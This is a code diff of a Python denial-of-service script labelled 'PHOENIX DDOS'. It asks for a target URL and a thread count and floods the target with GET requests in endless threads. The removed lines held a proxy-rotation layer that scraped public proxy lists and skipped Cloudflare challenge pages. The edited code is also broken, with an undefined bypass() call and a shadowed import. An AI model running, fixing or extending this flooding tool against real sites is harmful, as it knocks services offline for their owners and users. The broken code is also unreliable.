@@ -2,41 +2,16 @@
 import socket
 import random
 import urllib.parse # To parse the url and get the host and port
-import requests as r, time, random, os, threading, click, fake_headers
+import requests as random, os, threading
 import threading # To use threading
 import string # To generate random payload
 import undetected_chromedriver as uc # To use undetected-chromedriver
-from fake_headers import Headers
-from colorama import Fore, Style, Back
+from colorama import Fore
 
-iphosts = [
-    'https://wtfismyip.com/text',
-    'https://ipinfo.io/ip',
-    'https://ipv4.icanhazip.com/',
-    'https://myexternalip.com/raw',
-    'https://ifconfig.io/ip',
-    'https://ipecho.net/plain'
-]
-
-global myip
-myip = r.post(random.choice(iphosts)).text
-
-class bcolors:
-        OKGREEN = '\033[92m'
-        WARNING = '\033[0;33m'
-        FAIL = '\033[91m'
-        ENDC = '\033[0m'
-        LITBU = '\033[94m'
-        YELLOW = '\033[3;33m'
-        CYAN = '\033[0;36'
-        colors = ['\033[92m', '\033[91m', '\033[0;33m']
-        RAND = random.choice(colors)
-
-def logo():
-        print(Fore.RED + 'PHOENIX DDOS')
-        print('')
-        print(Fore.RED + 'Dev: Mr.BotSytem')
-        print('')
+print(Fore.RED + 'PHOENIX DDOS')
+print('')
+print(Fore.RED + 'Dev: Mr.BotSytem')
+print('')
 
 # Define the target URL
 url = input("Enter the target URL: ") # Change this to the target URL
@@ -45,7 +20,6 @@ url = input("Enter the target URL: ") # Change this to the target URL
 parsed_url = urllib.parse.urlparse(url)
 host = parsed_url.hostname
 port = parsed_url.port or 80 # Default to 80 if no port is specified
-
 # Define the number of threads to use
 threads = int(input("Enter the number of threads: ")) # Change this to the number of threads
       
@@ -113,7 +87,7 @@ def attack():
 # Generate a random user agent from the list and a random payload with the user agent
     user_agent = random.choice(user_agents)
     payload = f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {user_agent}\r\n\r\n".encode()
-
+    bypass()
 # Send requests to the target in an infinite loop
     while True:
         # Send the payload to the target and print a success message
@@ -125,77 +99,4 @@ for i in range(threads):
     # Create and start a thread object with the attack function as the target
     threading.Thread(target=attack).start()
 
-def check_prox(array, url):
-        #myip = r.post(random.choice(iphosts)).text
-        for prox in array:
-                t = threading.Thread(target=check, args=(myip, prox, url))
-                t.start()
-                
-def check(myip, prox, url):
-        try:
-                ipx = r.get(random.choice(iphosts), proxies={'http': "http://{}".format(prox), 'https':"http://{}".format(prox)}).text
-                if ipx == myip:
-                        pass
-                else:
-                        print(Fore.RED+Back.RED+"{} good proxy".format(prox)+Style.RESET_ALL)
-                        t = threading.Thread(target=ddos, args=(prox, url))
-                        t.start()
-        except:
-                pass
-
-def ddos(prox, url):
-        proxies={"http":"http://{}".format(prox), "https":"http://{}".format(prox)}
-        colors = ["\x1B[31m", "\x1B[32m", "\x1B[33m", "\x1B[34m", "\x1B[35m", "\x1B[36m", "\x1B[37m"]
-        color = random.choice(colors)
-        while True:
-                headers1 = Headers(headers=True).generate()
-                t = threading.Thread(target=start_ddos, args=(prox, url, headers1, proxies, color))
-                t.start()
-                
-def start_ddos(prox, url, headers1, proxies, color):
-        try:
-                s1 = r.Session()
-                req1 = s1.get(url, headers=headers1, proxies=proxies)
-                if req1.status_code == 200:
-                        if "<title>Just a moment...</title>" in req1.text:
-                                pass
-                        else:
-                                print(Fore.RED+"{} sent requests...".format(prox))
-        except:
-                pass
-
-@click.command()
-@click.option('--proxy', '-p', help="<File with a proxy>")
-@click.option('--url', '-u', help="<URL>")
-def main(proxy, url):
-        clear()
-        logo()
-        if url == None:
-                print(Fore.RED + "")
-                url = input(Fore.RED + "[+] Target:  ")
-        if url[:4] != "http":
-                print(Fore.RED+"Enter the full URL (example: https://google.com/)"+Style.RESET_ALL)
-                exit()
-        if proxy == None:
-                while True:
-                        req1 = r.get("https://api.proxyscrape.com/v2/?request=displayproxies").text
-                        req2 = r.get("https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt").text
-                        req3 = r.get("https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt").text
-                        req4 = r.get("https://raw.githubusercontent.com/UptimerBot/proxy-list/master/proxies/http.txt").text
-                        req5 = r.get("https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt").text
-                        req6 = r.get("https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt").text
-                        req = req1 + req2 + req3 + req4 + req5 + req6
-                        array = req.split()
-                        print(Fore.RED+"Found {} new proxies".format(len(array))+Style.RESET_ALL)
-                        check_prox(array, url)
-        else:
-                try:
-                        fx = open(proxy)
-                        array = fx.read().split()
-                        print("Found {} proxies in {}.\nChecking proxies...".format(len(array), proxy))
-                        check_prox(array, url)
-                except FileNotFoundError:
-                        print(Fore.RED+"File {} not found.".format(proxy)+Style.RESET_ALL)
-                        exit()
-
-main()
+attack()
